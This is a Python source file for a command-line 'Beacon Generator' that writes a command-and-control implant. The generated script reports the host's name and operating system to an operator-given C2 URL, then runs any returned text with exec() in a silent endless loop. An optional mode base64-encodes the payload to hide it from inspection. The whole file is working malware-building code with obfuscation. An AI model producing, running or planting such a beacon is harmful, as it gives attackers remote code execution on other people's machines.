import os
import argparse
import base64
from textwrap import dedent

DEFAULT_OUTPUT_PATH = "build/beacon/beacon.py"

def generate_python_beacon(server_url, interval, output_file):
    os.makedirs(os.path.dirname(output_file), exist_ok=True)

    beacon_code = f"""
    import time
    import requests
    import platform
    import socket

    def get_info():
        return {{
            'hostname': socket.gethostname(),
            'os': platform.system(),
            'release': platform.release()
        }}

    def beacon_loop():
        while True:
            try:
                info = get_info()
                response = requests.post("{server_url}/beacon", json=info)
                command = response.text.strip()
                if command:
                    exec(command)
            except Exception as e:
                pass
            time.sleep({interval})

    if __name__ == "__main__":
        beacon_loop()
    """

    with open(output_file, "w") as f:
        f.write(dedent(beacon_code).strip())

    print(f"[+] Beacon generated and saved to {output_file}")

def generate_encoded_beacon(server_url, interval, output_file):
    os.makedirs(os.path.dirname(output_file), exist_ok=True)

    buffer = f"""
    import base64
    exec(base64.b64decode("{base64.b64encode(dedent(f'''
    import time
    import requests
    import platform
    import socket

    def get_info():
        return {{
            'hostname': socket.gethostname(),
            'os': platform.system(),
            'release': platform.release()
        }}

    def beacon_loop():
        while True:
            try:
                info = get_info()
                response = requests.post('{server_url}/beacon', json=info)
                command = response.text.strip()
                if command:
                    exec(command)
            except:
                pass
            time.sleep({interval})
    if __name__ == '__main__':
        beacon_loop()
    ''').encode()).decode()}")
    )
    """

    with open(output_file, "w") as f:
        f.write(buffer.strip())

    print(f"[+] Obfuscated beacon saved to {output_file}")

def main():
    parser = argparse.ArgumentParser(description="Beacon Generator")
    parser.add_argument("server", help="C2 server URL (e.g., http://127.0.0.1:5000)")
    parser.add_argument("--interval", type=int, default=10, help="Beacon interval in seconds")
    parser.add_argument("-o", "--output", default=DEFAULT_OUTPUT_PATH, help="Output file name")
    parser.add_argument("--obfuscate", action="store_true", help="Base64 encode the payload")

    args = parser.parse_args()

    if args.obfuscate:
        generate_encoded_beacon(args.server, args.interval, args.output)
    else:
        generate_python_beacon(args.server, args.interval, args.output)

if __name__ == "__main__":
    main()

